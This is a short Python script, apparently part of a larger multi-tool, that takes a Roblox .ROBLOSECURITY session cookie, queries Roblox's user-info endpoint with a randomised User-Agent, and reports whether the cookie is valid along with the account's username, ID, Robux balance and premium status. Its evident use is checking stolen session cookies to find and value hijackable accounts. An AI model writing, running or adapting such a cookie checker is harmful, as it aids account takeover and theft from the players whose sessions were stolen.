#!/usr/bin/env python3
# GNU GENERAL PUBLIC LICENSE
# See the file 'LICENSE' for details
# ---------------------------------------------------------------------
# EN:
#     - Touch or modify the code below. If there is an error,
#     - please fix it and make a pull request ;)
from configs.util import *
from configs.term import *
from configs.config import *

try:
    import requests
    import json
except Exception as e:
    General_Error(e)

Title("Roblox Cookie Info")

try:
    user_agent = ChoiceUserAgent()
    headers = {"User-Agent": user_agent}

    print(
        f"\n{Pre("!")} Selected User-Agent: {color.WHITE + user_agent}"
    )
    cookie = input(f"{Pre(">")} Cookie -> {color.WHITE}")
    print(
        f"{Pre("~")} Information Recovery..{color.RESET}"
    )
    try:
        response = requests.get(
            "https://www.roblox.com/mobileapi/userinfo",
            headers=headers,
            cookies={".ROBLOSECURITY": cookie},
        )
        api = json.loads(response.text)
        status = "Valid"
        username_roblox = api.get("UserName", "None")
        user_id_roblox = api.get("UserID", "None")
        robux_roblox = api.get("RobuxBalance", "None")
        premium_roblox = api.get("IsPremium", "None")
        avatar_roblox = api.get("ThumbnailUrl", "None")
        builders_club_roblox = api.get("IsAnyBuildersClubMember", "None")
    except:
        status = "Invalid"
        username_roblox = "None"
        user_id_roblox = "None"
        robux_roblox = "None"
        premium_roblox = "None"
        avatar_roblox = "None"
        builders_club_roblox = "None"

    print(
        f"""
    {Pre("+",color.BLUE)} Status        : {color.WHITE}{status}{color.BLUE}
    {Pre("+",color.BLUE)} Username      : {color.WHITE}{username_roblox}{color.BLUE}
    {Pre("+",color.BLUE)} Id            : {color.WHITE}{user_id_roblox}{color.BLUE}
    {Pre("+",color.BLUE)} Robux         : {color.WHITE}{robux_roblox}{color.BLUE}
    {Pre("+",color.BLUE)} Premium       : {color.WHITE}{premium_roblox}{color.BLUE}
    {Pre("+",color.BLUE)} Builders Club : {color.WHITE}{builders_club_roblox}{color.BLUE}
    {Pre("+",color.BLUE)} Avatar        : {color.WHITE}{avatar_roblox}{color.BLUE}
    """
    )
    Continue()

except Exception as e:
    General_Error(e)
